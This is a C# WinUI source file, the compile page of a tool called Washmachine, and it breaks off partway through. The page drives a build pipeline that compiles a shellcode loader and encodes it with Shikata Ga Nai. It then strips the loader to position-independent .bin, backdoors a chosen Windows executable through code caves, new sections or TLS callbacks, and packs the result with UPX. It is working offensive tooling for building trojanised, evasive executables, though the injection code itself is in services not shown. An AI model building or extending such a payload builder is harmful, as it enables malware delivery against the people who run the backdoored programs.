using Microsoft.UI;
using Microsoft.UI.Xaml;
using Microsoft.UI.Xaml.Controls;
using Microsoft.UI.Xaml.Media;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.IO.Compression;
using System.Net.Http;
using System.Text.Json;
using System.Text.Json.Serialization;
using Washmachine.Controllers;
using Washmachine.Logging;
using Washmachine.Models;
using Washmachine.Services;
using Windows.Storage.Pickers;
using Windows.UI;
using WinRT.Interop;

namespace Washmachine.Views;

public sealed partial class CompilePage : Page
{
    public static CompilePage? Instance { get; private set; }

    // Read-only accessors used by PipelinePage to build the live recipe view.
    public bool   IsStripToBinChecked      => StripToBinCheck?.IsChecked == true;
    public string? OutputDirectory          => OutputPath?.Text;
    public bool   GenerateDebugInfoEnabled => GenerateDebugInfo?.IsChecked == true;
    public bool   VerboseBuildEnabled      => VerboseBuildCheck?.IsChecked == true;
    public string? SelectedCompilerDisplay  => SelectedCompilerCard is { } c ? $"{c.Kind} ({c.Path})" : null;

    private readonly ObservableCollection<CompilerCardViewModel> _compilerCards = new();
    private CompilerCardViewModel? SelectedCompilerCard => CompilerCardsList?.SelectedItem as CompilerCardViewModel;

    private readonly IAppLogger _logger;
    private readonly AppPaths _paths;
    private readonly ICompilerService _compiler;
    private readonly ICompilerToolLocator _toolLocator;
    private readonly PeBackdoorService _backdoorService;
    private readonly IPlaybookService _snippets;
    private string? _lastOutputPath;
    private List<CompilerToolCandidate>? _compilerCandidates;

    private bool _compilersDetected;
    private readonly CliExecutor _cli = new();

    private static readonly string MinGwDownloadUrl = 
        "https://github.com/niXman/mingw-builds-binaries/releases/download/14.2.0-rt_v12-rev0/x86_64-14.2.0-release-win32-seh-ucrt-rt_v12-rev0.7z";

    public CompilePage()
    {
        NavigationCacheMode = Microsoft.UI.Xaml.Navigation.NavigationCacheMode.Required;
        InitializeComponent();
        Instance = this;

        _paths = new AppPaths();
        _logger = new RichEditBoxLogger(BuildLogBox);
        _toolLocator = new CompilerToolLocator(_logger);
        _backdoorService = new PeBackdoorService(_paths, _logger);

        var bin2ShellRunner = new Bin2ShellRunner(_paths);
        _snippets = new PlaybookService(_paths);
        _compiler = new CompilerService(_paths, bin2ShellRunner, _snippets, _toolLocator, _logger);

        CompilerCardsList.ItemsSource = _compilerCards;

        Loaded += CompilePage_Loaded;
    }

    protected override void OnNavigatedTo(Microsoft.UI.Xaml.Navigation.NavigationEventArgs e)
    {
        base.OnNavigatedTo(e);
        UpdateConfigurationSummary();
    }

    private async void CompilePage_Loaded(object sender, RoutedEventArgs e)
    {
        if (!_compilersDetected)
        {
            await RefreshCompilers();
            _compilersDetected = true;
        }
        LoadLlvmPasses();
        UpdateConfigurationSummary();
    }

    private async Task RefreshCompilers()
    {
        _compilerCards.Clear();
        CompilerStatus.Text = "Detecting compilers...";
        DownloadCompilerPanel.Visibility = Visibility.Collapsed;
        NoCompilerCard.Visibility = Visibility.Collapsed;

        try
        {
            var result = await _toolLocator.DiscoverAsync();
            _compilerCandidates = result.Candidates?.ToList();
            PopulateCompilerCards(_compilerCandidates);

            if (_compilerCards.Count == 0)
            {
                CompileButton.IsEnabled = false;
                CompilerStatus.Text = "No compiler detected. Install MSVC / MinGW / LLVM, or drop one into Tools\\LLVM\\bin.";
                CompilerStatus.Foreground = App.ThemeBrush("DraculaOrangeBrush");
                NoCompilerCard.Visibility = Visibility.Visible;
                DownloadCompilerPanel.Visibility = Visibility.Visible;
            }
            else
            {
                CompilerCardsList.SelectedIndex = 0;
                CompileButton.IsEnabled = true;
                CompilerStatus.Text = $"Found {_compilerCards.Count} compiler(s).";
                CompilerStatus.Foreground = App.ThemeBrush("DraculaGreenBrush");
            }
        }
        catch (Exception ex)
        {
            CompilerStatus.Text = $"Error: {ex.Message}";
            CompilerStatus.Foreground = App.ThemeBrush("DraculaRedBrush");
            DownloadCompilerPanel.Visibility = Visibility.Visible;
        }
    }

    private void PopulateCompilerCards(IReadOnlyList<CompilerToolCandidate>? candidates)
    {
        _compilerCards.Clear();
        if (candidates == null) return;
        foreach (var c in candidates)
            _compilerCards.Add(CompilerCardViewModel.FromCandidate(c));
    }

    // ─── LLVM pass loading and backend selection ─────────────────────────────

    private void LoadLlvmPasses()
    {
        try
        {
            var registry = new LlvmPassRegistry(_paths, _logger);
            var passes = registry.GetAllPasses();

            LlvmPassCheckboxes.Children.Clear();
            foreach (var pass in passes)
            {
                var status = pass.IsBuilt ? "ready" : "stub";
                var cb = new CheckBox
                {
                    Content = $"{pass.Name}  ({status})",
                    Tag = pass.Id,
                    IsEnabled = true,
                };
                ToolTipService.SetToolTip(cb,
                    string.IsNullOrEmpty(pass.Description)
                        ? (pass.IsBuilt
                            ? "Compiled — will be loaded as -fpass-plugin."
                            : "No compiled pass.dll yet — selection is recorded but the pipeline will skip with a warning.")
                        : pass.Description);
                LlvmPassCheckboxes.Children.Add(cb);
            }
        }
        catch (Exception ex)
        {
            _logger.Warn($"Could not load LLVM passes: {ex.Message}");
        }
    }

    private void CompilerCardsList_SelectionChanged(object sender, SelectionChangedEventArgs e)
    {
        if (LlvmModeExpander is null) return;

        var card = SelectedCompilerCard;
        bool isLlvm = card?.IsLlvm == true;

        LlvmModeExpander.Visibility = isLlvm ? Visibility.Visible : Visibility.Collapsed;

        // Surface the implicit backend choice in the status line so users understand
        // what selecting a card just changed.
        if (card != null)
        {
            CompilerStatus.Text = isLlvm
                ? $"Active: {card.Kind} → LLVM obfuscation backend enabled."
                : $"Active: {card.Kind} → deterministic backend.";
            CompilerStatus.Foreground = App.ThemeBrush(isLlvm
                ? "DraculaPurpleBrush"
                : "DraculaGreenBrush");
        }
    }

    /// <summary>Resolves the backend tag the CLI expects based on the currently selected card.</summary>
    private string GetSelectedCompilationBackend()
        => SelectedCompilerCard?.IsLlvm == true ? "LlvmObfuscated" : "Deterministic";

    private List<string> GetSelectedLlvmPassIds()
    {
        var ids = new List<string>();
        foreach (var child in LlvmPassCheckboxes.Children)
        {
            if (child is CheckBox cb && cb.IsChecked == true && cb.Tag is string id)
                ids.Add(id);
        }
        return ids;
    }

    private void LlvmSelectAllPasses_Click(object sender, RoutedEventArgs e)
        => SetAllPasses(true);

    private void LlvmClearAllPasses_Click(object sender, RoutedEventArgs e)
        => SetAllPasses(false);

    private void SetAllPasses(bool isChecked)
    {
        foreach (var child in LlvmPassCheckboxes.Children)
            if (child is CheckBox cb) cb.IsChecked = isChecked;
    }

    // ─── Compilation-flow helpers ────────────────────────────────────────────

    private string GetTag(ComboBox combo, string fallback)
        => combo.SelectedItem is ComboBoxItem item && item.Tag is string s ? s : fallback;

    private IEnumerable<string> SplitDefines(string? raw)
    {
        if (string.IsNullOrWhiteSpace(raw)) yield break;
        foreach (var tok in raw.Split(new[] { ',', ' ', '\t', ';' }, StringSplitOptions.RemoveEmptyEntries))
        {
            var t = tok.Trim();
            if (t.Length > 0) yield return t;
        }
    }

    private IEnumerable<string> SplitExtraFlags(string? raw)
    {
        if (string.IsNullOrWhiteSpace(raw)) yield break;
        // Naive shell-split: respects double-quoted segments
        var sb = new System.Text.StringBuilder();
        bool inQ = false;
        foreach (var c in raw)
        {
            if (c == '"') { inQ = !inQ; continue; }
            if (!inQ && char.IsWhiteSpace(c))
            {
                if (sb.Length > 0) { yield return sb.ToString(); sb.Clear(); }
                continue;
            }
            sb.Append(c);
        }
        if (sb.Length > 0) yield return sb.ToString();
    }

    private string GetSelectedLlvmToolchainMode()
        => LlvmToolchainRadio?.SelectedIndex switch
        {
            1 => "clang-cl",
            2 => "clang++",
            _ => "auto"
        };

    private void UpdateConfigurationSummary()
    {
        var mainPage = MainPage.Instance;
        var backdoorPage = BackdooringPage.Instance;
        var packingPage = PackingPage.Instance;
        var finalizePage = FinalizePage.Instance;

        // ── Payload summary ────────────────────────────────────────────
        if (mainPage != null)
        {
            // Shellcode source
            var src = mainPage.CurrentShellcodeSource;
            SummaryShellcode.Text = src switch
            {
                ShellcodeSource.File    => !string.IsNullOrEmpty(mainPage.ShellcodeFileTextBox.Text)
                                            ? Path.GetFileName(mainPage.ShellcodeFileTextBox.Text)
                                            : "File (not set)",
                ShellcodeSource.Raw     => !string.IsNullOrEmpty(mainPage.ShellcodeRawTextBox.Text)
                                            ? $"Raw ({mainPage.ShellcodeRawTextBox.Text.Length} chars)"
                                            : "Raw (empty)",
                ShellcodeSource.Url     => !string.IsNullOrEmpty(mainPage.ShellcodeUrlTextBox.Text)
                                            ? "Web payload"
                                            : "URL (not set)",
                ShellcodeSource.Generic => mainPage.GenericShellcodeCombo.SelectedItem is not null
                                            ? mainPage.GenericShellcodeCombo.SelectedItem.ToString() ?? "Generic"
                                            : "Generic (not set)",
                _                       => "Not configured"
            };

            // Template
            if (mainPage.TemplateCombo.SelectedItem is not null)
                SummaryTemplate.Text = mainPage.TemplateCombo.SelectedItem.ToString() ?? "Default";
            else
                SummaryTemplate.Text = "Not selected";

            // Encoder
            if (mainPage.EncoderCombo.SelectedItem is not null)
                SummaryEncoder.Text = mainPage.EncoderCombo.SelectedItem.ToString() ?? "None";
            else
                SummaryEncoder.Text = "None";

            if (mainPage.IsShikataGaNaiEnabled)
            {
                SummaryEncoder.Text = $"{SummaryEncoder.Text} + SGN (x{mainPage.ShikataGaNaiEncodeCount}, max {mainPage.ShikataGaNaiMaxBytes} bytes)";
            }

            // Envelope
            if (mainPage.EnvelopeCombo.SelectedItem is not null)
                SummaryEnvelope.Text = mainPage.EnvelopeCombo.SelectedItem.ToString() ?? "None";
            else
                SummaryEnvelope.Text = "None";
        }
        else
        {
            SummaryShellcode.Text = "Not configured";
            SummaryTemplate.Text = "Not selected";
            SummaryEncoder.Text = "None";
            SummaryEnvelope.Text = "None";
        }

        // ── Backdooring summary ────────────────────────────────────────
        if (backdoorPage != null && backdoorPage.IsBackdooringEnabled)
        {
            BackdoorSummaryCard.Opacity = 1.0;
            BackdoorStatusBadge.Background = App.ThemeBrush("DraculaGreenBrush");
            BackdoorStatusText.Text = "Enabled";
            BackdoorDetails.Visibility = Visibility.Visible;
            BackdoorDisabledText.Visibility = Visibility.Collapsed;

            SummaryTargetPe.Text = backdoorPage.TargetPeFilePath != null 
                ? Path.GetFileName(backdoorPage.TargetPeFilePath) 
                : "Not selected";

            SummaryInjectionMethod.Text = backdoorPage.SelectedInjectionMethod switch
            {
                InjectionMethod.CodeCave        => "Code Cave",
                InjectionMethod.NewSection      => "New Section",
                InjectionMethod.SectionExtension => "Section Extension",
                _                               => backdoorPage.SelectedInjectionMethod.ToString()
            };

            SummaryCarrier.Text = backdoorPage.SelectedCarrierInvoke switch
            {
                CarrierInvoke.EntryPointHijack     => "Entry Point Hijack",
                CarrierInvoke.EntryFunctionBackdoor => "Function Backdoor",
                CarrierInvoke.TlsCallback           => "TLS Callback",
                _                                  => backdoorPage.SelectedCarrierInvoke.ToString()
            };
        }
        else
        {
            BackdoorSummaryCard.Opacity = 0.5;
            BackdoorStatusBadge.Background = App.ThemeBrush("TextFillColorSecondaryBrush");
            BackdoorStatusText.Text = "Disabled";
            BackdoorDetails.Visibility = Visibility.Collapsed;
            BackdoorDisabledText.Visibility = Visibility.Visible;
        }

        // ── Packing summary ───────────────────────────────────────────
        if (packingPage != null && packingPage.IsPackingEnabled)
        {
            PackingSummaryCard.Opacity = 1.0;
            PackingStatusBadge.Background = App.ThemeBrush("DraculaGreenBrush");
            PackingStatusText.Text = "Enabled";
            PackingDetails.Visibility = Visibility.Visible;
            PackingDisabledText.Visibility = Visibility.Collapsed;

            SummaryPacker.Text = !string.IsNullOrEmpty(packingPage.UpxPath) ? "UPX" : "UPX (not found)";
            SummaryPackLevel.Text = packingPage.SelectedCompressionLevel;
        }
        else
        {
            PackingSummaryCard.Opacity = 0.5;
            PackingStatusBadge.Background = App.ThemeBrush("TextFillColorSecondaryBrush");
            PackingStatusText.Text = "Disabled";
            PackingDetails.Visibility = Visibility.Collapsed;
            PackingDisabledText.Visibility = Visibility.Visible;
        }

        // ── Build pipeline description ─────────────────────────────────
        var steps = new List<string> { "Template compile" };
        if (mainPage?.IsShikataGaNaiEnabled == true && !mainPage.IsShikataGaNaiPostPlacement)
            steps.Insert(0, "Shikata Ga Nai (pre)");
        steps.Insert(mainPage?.IsShikataGaNaiEnabled == true && !mainPage.IsShikataGaNaiPostPlacement ? 1 : 0, "Bin2Shell");
        if (StripToBinCheck?.IsChecked == true)
            steps.Add("Strip to .bin");
        if (mainPage?.IsShikataGaNaiEnabled == true && mainPage.IsShikataGaNaiPostPlacement)
            steps.Add("Shikata Ga Nai (post)");
        if (backdoorPage?.IsBackdooringEnabled == true)
            steps.Add("Backdoor PE");
        if (packingPage?.IsPackingEnabled == true)
            steps.Add("Pack with UPX");
        if (finalizePage is { IsFinalizationEnabled: true } &&
            (finalizePage.IsCloneEnabled || finalizePage.NopPaddingBytes > 0))
        {
            steps.Add("Finalize output");
        }
        steps.Add("Output");
        BuildDescription.Text = string.Join(" → ", steps);
    }

    private void GoToPayload_Click(object sender, RoutedEventArgs e) => NavigateToPage("MainPage");
    private void GoToBackdooring_Click(object sender, RoutedEventArgs e) => NavigateToPage("BackdooringPage");
    private void GoToPacking_Click(object sender, RoutedEventArgs e) => NavigateToPage("PackingPage");

    private void NavigateToPage(string pageTag)
    {
        if (App.ActiveWindow is MainWindow mainWindow)
        {
            var navView = mainWindow.Content as NavigationView;
            if (navView != null)
            {
                var item = navView.MenuItems.OfType<NavigationViewItem>()
                    .FirstOrDefault(i => i.Tag?.ToString() == pageTag);
                if (item != null)
                {
                    navView.SelectedItem = item;
                }
            }
        }
    }

    private async void RefreshCompiler_Click(object sender, RoutedEventArgs e)
    {
        await RefreshCompilersWithDialog();
    }

    private async Task RefreshCompilersWithDialog()
    {
        var detectionWindow = new CompilerDetectionWindow();
        detectionWindow.Show();

        try
        {
            detectionWindow.AppendLog("Starting compiler detection...");
            detectionWindow.UpdateStatus("Scanning PATH environment...", -1);

            // Create a logging wrapper for the tool locator
            var loggingLocator = new LoggingCompilerToolLocator(_toolLocator, msg => detectionWindow.AppendLog(msg));

            detectionWindow.AppendLog("Checking PATH directories for compilers...");
            var result = await loggingLocator.DiscoverWithLoggingAsync();
            _compilerCandidates = result.Candidates?.ToList();

            // Update UI
            PopulateCompilerCards(result.Candidates);

            if (_compilerCards.Count == 0)
            {
                CompileButton.IsEnabled = false;
                CompilerStatus.Text = "No compiler detected. Install MSVC / MinGW / LLVM, or drop one into Tools\\LLVM\\bin.";
                CompilerStatus.Foreground = App.ThemeBrush("DraculaOrangeBrush");
                NoCompilerCard.Visibility = Visibility.Visible;
                DownloadCompilerPanel.Visibility = Visibility.Visible;

                detectionWindow.SetComplete(false, "No compilers found");
                detectionWindow.AppendLog("\n❌ No compilers detected. Please install MSVC / MinGW / LLVM, or drop a compiler into Tools\\LLVM\\bin.");
            }
            else
            {
                foreach (var compiler in result.Candidates!)
                    detectionWindow.AppendLog($"  ✓ Found: {compiler.Kind} at {compiler.Path}");

                CompilerCardsList.SelectedIndex = 0;
                CompileButton.IsEnabled = true;
                CompilerStatus.Text = $"Found {_compilerCards.Count} compiler(s).";
                CompilerStatus.Foreground = App.ThemeBrush("DraculaGreenBrush");
                NoCompilerCard.Visibility = Visibility.Collapsed;
                DownloadCompilerPanel.Visibility = Visibility.Collapsed;

                detectionWindow.SetComplete(true, $"Found {_compilerCards.Count} compiler(s)");
                detectionWindow.AppendLog($"\n✓ Detection complete. {_compilerCards.Count} compiler(s) available.");
            }

            // Log any errors encountered
            if (result.Errors != null && result.Errors.Count > 0)
            {
                detectionWindow.AppendLog("\nWarnings during detection:");
                foreach (var err in result.Errors)
                {
                    detectionWindow.AppendLog($"  ⚠ {err}");
                }
            }
        }
        catch (Exception ex)
        {
            CompilerStatus.Text = $"Error: {ex.Message}";
            CompilerStatus.Foreground = App.ThemeBrush("DraculaRedBrush");
            DownloadCompilerPanel.Visibility = Visibility.Visible;

            detectionWindow.SetComplete(false, "Detection failed");
            detectionWindow.AppendLog($"\n❌ Error: {ex.Message}");
        }
    }

    /// <summary>
    /// Wrapper that adds logging during compiler discovery.
    /// </summary>
    private sealed class LoggingCompilerToolLocator
    {
        private readonly ICompilerToolLocator _inner;
        private readonly Action<string> _log;

        public LoggingCompilerToolLocator(ICompilerToolLocator inner, Action<string> log)
        {
            _inner = inner;
            _log = log;
        }

        public async Task<CompilerToolDiscoveryResult> DiscoverWithLoggingAsync()
        {
            _log("Scanning Visual Studio installations...");
            await Task.Delay(100); // Give UI time to update

            _log("Checking vswhere for VS installations...");
            await Task.Delay(50);

            _log("Scanning known compiler locations...");
            var result = await _inner.DiscoverAsync();

            _log($"Discovery complete. Found {result.Candidates?.Count ?? 0} candidate(s).");
            return result;
        }
    }

    private async void DownloadCompiler_Click(object sender, RoutedEventArgs e)
    {
        DownloadCompilerButton.IsEnabled = false;
        DownloadCompilerButton.Content = "Downloading...";
        _logger.Info("Downloading MinGW-w64 compiler...");

        try
        {
            var toolsDir = Path.Combine(AppContext.BaseDirectory, "Tools");
            Directory.CreateDirectory(toolsDir);

            var archivePath = Path.Combine(toolsDir, "mingw64.7z");

            // Download
            using var httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0");
            httpClient.Timeout = TimeSpan.FromMinutes(10);

            _logger.Info("Downloading MinGW-w64 (this may take a few minutes)...");
            var response = await httpClient.GetAsync(MinGwDownloadUrl);
            response.EnsureSuccessStatusCode();

            await using (var fs = File.Create(archivePath))
            {
                await response.Content.CopyToAsync(fs);
            }

            _logger.Info("Download complete. Attempting extraction...");
            DownloadCompilerButton.Content = "Extracting...";

            // Try to find 7z.exe for extraction
            var sevenZipPath = Find7ZipExecutable();
            
            if (!string.IsNullOrEmpty(sevenZipPath))
            {
                _logger.Info($"Using 7-Zip: {sevenZipPath}");
                var extracted = await Extract7zArchiveAsync(sevenZipPath, archivePath, toolsDir);
                
                if (extracted)
                {
                    _logger.Ok("Extraction complete!");
                    DownloadCompilerButton.Content = "Download Complete";
                    
                    // Clean up archive
                    try { File.Delete(archivePath); } catch { }
                    
                    // Refresh compilers to pick up the new MinGW
                    _logger.Info("Detecting newly installed compiler...");
                    await RefreshCompilersWithDialog();
                }
                else
                {
                    _logger.Warn("Extraction failed. Please extract manually.");
                    OpenToolsFolderWithInstructions(toolsDir, archivePath);
                }
            }
            else
            {
                _logger.Warn("7-Zip not found. Please extract the archive manually.");
                OpenToolsFolderWithInstructions(toolsDir, archivePath);
            }
        }
        catch (Exception ex)
        {
            _logger.Error($"Download failed: {ex.Message}");
            DownloadCompilerButton.Content = "Download Failed";
        }
        finally
        {
            DownloadCompilerButton.IsEnabled = true;
        }
    }

    private string? Find7ZipExecutable()
    {
        // Check common locations for 7z.exe
        var candidates = new[]
        {
            // Bundled in testing assets (for development)
            Path.Combine(FindRepoRoot() ?? "", "testing assets", "binary", "injectables", "7z.exe"),
            // Standard 7-Zip installation
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "7-Zip", "7z.exe"),
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86), "7-Zip", "7z.exe"),
            // Portable in Tools folder
            Path.Combine(AppContext.BaseDirectory, "Tools", "7z.exe"),
        };

        foreach (var candidate in candidates)
        {
            if (File.Exists(candidate))
                return candidate;
        }

        return null;
    }

    private string? FindRepoRoot()
    {
        var current = AppContext.BaseDirectory;
        while (!string.IsNullOrEmpty(current))
        {
            if (Directory.Exists(Path.Combine(current, ".git")) ||
                File.Exists(Path.Combine(current, "washmachine.sln")))
            {
                return current;
            }
            var parent = Path.GetDirectoryName(current);
            if (parent == current) break;
            current = parent;
        }
        return null;
    }

    private async Task<bool> Extract7zArchiveAsync(string sevenZipPath, string archivePath, string outputDir)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = sevenZipPath,
                Arguments = $"x \"{archivePath}\" -o\"{outputDir}\" -y",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using var proc = Process.Start(psi);
            if (proc == null)
            {
                _logger.Error("Failed to start 7-Zip process");
                return false;
            }

            var output = await proc.StandardOutput.ReadToEndAsync();
            var errors = await proc.StandardError.ReadToEndAsync();
            await proc.WaitForExitAsync();

            if (proc.ExitCode == 0)
            {
                _logger.Info("Archive extracted successfully.");
                return true;
            }
            else
            {
                _logger.Error($"7-Zip exit code: {proc.ExitCode}");
                if (!string.IsNullOrWhiteSpace(errors))
                    _logger.Error(errors);
                return false;
            }
        }
        catch (Exception ex)
        {
            _logger.Error($"Extraction error: {ex.Message}");
            return false;
        }
    }

    private void OpenToolsFolderWithInstructions(string toolsDir, string archivePath)
    {
        _logger.Info($"Archive location: {archivePath}");
        _logger.Info($"Extract to: {toolsDir}");
        DownloadCompilerButton.Content = "Download Complete";
        _logger.Ok("Download complete. Extract and click 'Detect' to find the compiler.");

        // Open the tools folder
        Process.Start(new ProcessStartInfo
        {
            FileName = toolsDir,
            UseShellExecute = true
        });
    }

    private async void BrowseOutput_Click(object sender, RoutedEventArgs e)
    {
        var picker = new FolderPicker();
        picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
        picker.FileTypeFilter.Add("*");

        var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
        InitializeWithWindow.Initialize(picker, hwnd);

        var folder = await picker.PickSingleFolderAsync();
        if (folder != null)
        {
            OutputPath.Text = folder.Path;
        }
    }

    private async void CompileButton_Click(object sender, RoutedEventArgs e)
    {
        CompileButton.IsEnabled = false;
        CompileProgressPanel.Visibility = Visibility.Visible;
        CompileResultPanel.Visibility = Visibility.Collapsed;

        try
        {
            _logger.Info("═══════════════════════════════════════════════");
            _logger.Info("Starting Build Pipeline");
            _logger.Info("═══════════════════════════════════════════════");

            var mainPage    = MainPage.Instance;
            var backdoorPage = BackdooringPage.Instance;
            var packingPage  = PackingPage.Instance;

            if (mainPage == null)
            {
                ShowCompileResult(false, "Navigate to Payload page first to configure shellcode and template.");
                return;
            }

            // ── Step 1: Compile payload via CLI ──────────────────────────
            CompileProgressText.Text = "Step 1: Compiling payload...";
            _logger.Info("\n[Step 1] Compiling payload loader...");

            var (compiledExePath, cliCompileSuccess) = await RunCliCompileAsync(mainPage);

            if (!cliCompileSuccess || compiledExePath == null)
            {
                ShowCompileResult(false, "Compilation failed. Check the log for details.");
                return;
            }

            _logger.Ok($"Compiled: {Path.GetFileName(compiledExePath)}");
            var currentOutput = compiledExePath;
            var tempDir = Path.GetDirectoryName(compiledExePath);

            // ── Optional: Strip compiled exe to flat .bin ─────────────────
            bool needPostSgn = mainPage.IsShikataGaNaiEnabled && mainPage.IsShikataGaNaiPostPlacement;
            bool doStrip = StripToBinCheck.IsChecked == true || needPostSgn;
            string? strippedBinPath = null;

            if (doStrip)
            {
                CompileProgressText.Text = "Step 1b: Stripping to flat .bin...";
                _logger.Info("\n[Step 1b] Stripping loader to position-independent .bin...");
                if (needPostSgn && StripToBinCheck.IsChecked != true)
                    _logger.Info("  (strip auto-enabled because SGN placement = post)");
                strippedBinPath = await RunStripStepAsync(compiledExePath, tempDir ?? Path.GetTempPath());
                if (strippedBinPath != null)
                    _logger.Ok($"Stripped: {Path.GetFileName(strippedBinPath)}");
                else
                    _logger.Warn("Strip step failed or produced no output.");
            }

            // ── Optional: Post-placement SGN on stripped .bin ─────────────
            if (needPostSgn)
            {
                if (strippedBinPath != null && File.Exists(strippedBinPath))
                {
                    CompileProgressText.Text = "Step 1c: Applying SGN to stripped .bin...";
                    _logger.Info("\n[Step 1c] Applying Shikata Ga Nai to stripped loader.bin (post placement)...");
                    var sgnOut = await RunPostSgnStepAsync(
                        strippedBinPath,
                        mainPage.ShikataGaNaiEncodeCount,
                        mainPage.ShikataGaNaiMaxBytes);
                    if (sgnOut != null)
                        _logger.Ok($"SGN-encoded: {Path.GetFileName(sgnOut)}");
                    else
                        _logger.Warn("SGN step failed — stripped .bin left unencoded.");
                }
                else
                {
                    _logger.Warn("SGN placement=post requested, but no stripped .bin was produced — skipping SGN.");
                }
            }

            // ── Resolve final output: backdoor flow vs loader-only flow ───
            //
            // Backdoor enabled  → defer the Save dialog until AFTER backdooring,
            //                     and only export the backdoored PE (the loader.exe and
            //                     bin2shell intermediates stay in temp, never shipped).
            // Backdoor disabled → keep the historical flow: prompt for the loader.exe
            //                     destination up front and copy it there.
            string outputDir;
            bool backdoorEnabled = backdoorPage?.IsBackdooringEnabled == true
                                    && backdoorPage.TargetPeFilePath != null;

            if (backdoorEnabled)
            {
                // Run the backdoor step into temp first.
                CompileProgressText.Text = "Step 2: Backdooring target PE...";
                _logger.Info("\n[Step 2] Backdooring target executable...");

                string backdoorWorkDir = tempDir ?? Path.GetTempPath();
                string? originalShellcode = ResolveOriginalShellcodePath(mainPage);

                if (originalShellcode == null || !File.Exists(originalShellcode))
                {
                    _logger.Error("Original shellcode .bin not found — cannot backdoor.");
                    ShowCompileResult(false, "Backdoor step requires the original shellcode .bin.");
                    return;
                }

                _logger.Info($"Using original shellcode: {Path.GetFileName(originalShellcode)} ({new FileInfo(originalShellcode).Length:N0} bytes)");
                var backdooredTemp = await RunBackdoorStepAsync(backdoorPage!, originalShellcode, backdoorWorkDir);
                if (backdooredTemp == null || !File.Exists(backdooredTemp))
                {
                    ShowCompileResult(false, "Backdoor step failed — see log.");
                    return;
                }

                // Resolve where the backdoored PE should land (user choice, or pre-set OutputPath).
                if (!string.IsNullOrWhiteSpace(OutputPath.Text))
                {
                    outputDir = OutputPath.Text;
                    Directory.CreateDirectory(outputDir);
                    var dest = Path.Combine(outputDir, Path.GetFileName(backdooredTemp));
                    File.Copy(backdooredTemp, dest, overwrite: true);
                    currentOutput = dest;
                }
                else
                {
                    var picker = new FileSavePicker();
                    picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
                    picker.SuggestedFileName = Path.GetFileNameWithoutExtension(backdoorPage!.TargetPeFilePath!) + "_backdoored";
                    picker.FileTypeChoices.Add("Executable", new List<string> { ".exe" });

                    var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
                    InitializeWithWindow.Initialize(picker, hwnd);

                    var file = await picker.PickSaveFileAsync();
                    if (file != null)
                    {
                        outputDir = Path.GetDirectoryName(file.Path) ?? Path.GetTempPath();
                        Directory.CreateDirectory(outputDir);
                        File.Copy(backdooredTemp, file.Path, overwrite: true);
                        currentOutput = file.Path;
                    }
                    else
                    {
                        // User cancelled — leave the backdoored artifact in the temp work dir.
                        outputDir = backdoorWorkDir;
                        currentOutput = backdooredTemp;
                    }
                }
            }
            else
            {
                _logger.Info("\n[Step 2] Backdooring: Skipped (disabled)");

                // No backdoor → the loader.exe IS the deliverable.
                if (!string.IsNullOrWhiteSpace(OutputPath.Text))
                {
                    outputDir = OutputPath.Text;
                }
                else
                {
                    var picker = new FileSavePicker();
                    picker.SuggestedStartLocation = PickerLocationId.DocumentsLibrary;
                    picker.SuggestedFileName = Path.GetFileName(compiledExePath);
                    picker.FileTypeChoices.Add("Executable", new List<string> { ".exe" });

                    var hwnd = WindowNative.GetWindowHandle(App.ActiveWindow!);
                    InitializeWithWindow.Initialize(picker, hwnd);

                    var file = await picker.PickSaveFileAsync();
                    if (file != null)
                    {
                        outputDir = Path.GetDirectoryName(file.Path) ?? Path.GetTempPath();
                        File.Copy(compiledExePath, file.Path, overwrite: true);
                        currentOutput = file.Path;
                    }
                    else
                    {
                        // User cancelled — keep in temp location.
                        outputDir = tempDir ?? Path.GetTempPath();
                    }
                }

                Directory.CreateDirectory(outputDir);

                // Copy compiled exe to output dir if not already there.
                if (string.Equals(currentOutput, compiledExePath, StringComparison.OrdinalIgnoreCase))
                {
                    var finalInOutDir = Path.Combine(outputDir, Path.GetFileName(compiledExePath));
                    if (!string.Equals(compiledExePath, finalInOutDir, StringComparison.OrdinalIgnoreCase))
                    {
                        File.Copy(compiledExePath, finalInOutDir, overwrite: true);
                        currentOutput = finalInOutDir;
                    }
                }
            }

            // ── Step 4: Pack (optional) ───────────────────────────────────
            if (packingPage?.IsPackingEnabled == true && !string.IsNullOrEmpty(packingPage.UpxPath))
            {
                CompileProgressText.Text = "Step 3: Packing with UPX...";
                _logger.Info("\n[Step 3] Packing with UPX...");
                currentOutput = await RunPackingStepAsync(packingPage, currentOutput, outputDir)
                                ?? currentOutput;
            }
            else
            {
                _logger.Info("\n[Step 3] Packing: Skipped (disabled)");
            }

            _lastOutputPath = outputDir;

            _logger.Info("\n═══════════════════════════════════════════════");
            _logger.Ok($"Build complete! Output: {Path.GetFileName(currentOutput)}");
            _logger.Info("═══════════════════════════════════════════════");

            ShowCompileResult(true, $"Success: {Path.GetFileName(currentOutput)}");

            if (OpenFolderAfterCompile.IsChecked == true)
            {
                Process.Start(new ProcessStartInfo { FileName = outputDir, UseShellExecute = true });
            }
        }
        catch (Exception ex)
        {
            _logger.Error($"Build error: {ex.Message}");
            ShowCompileResult(false, ex.Message);
        }
        finally
        {
            CompileButton.IsEnabled = true;
            CompileProgressPanel.Visibility = Visibility.Collapsed;
        }
    }

    /// <summary>
    /// Builds CLI compile arguments from the current MainPage state and runs the compile.
    /// Returns (exePath, success).
    /// </summary>
    private async Task<(string? exePath, bool success)> RunCliCompileAsync(MainPage mainPage)
    {
        if (!_cli.IsAvailable)
        {
            _logger.Error($"CLI not found: {_cli.CliPath}");
            return (null, false);
        }

        var args = new List<string> { "encode" };
        var finalizePage = FinalizePage.Instance;

        // Shellcode source
        switch (mainPage.CurrentShellcodeSource)
        {
            case ShellcodeSource.File:
                var scFile = mainPage.ShellcodeFileTextBox.Text.Trim();
                if (string.IsNullOrEmpty(scFile) || !File.Exists(scFile))
                {
                    _logger.Error("Shellcode file not set or not found.");
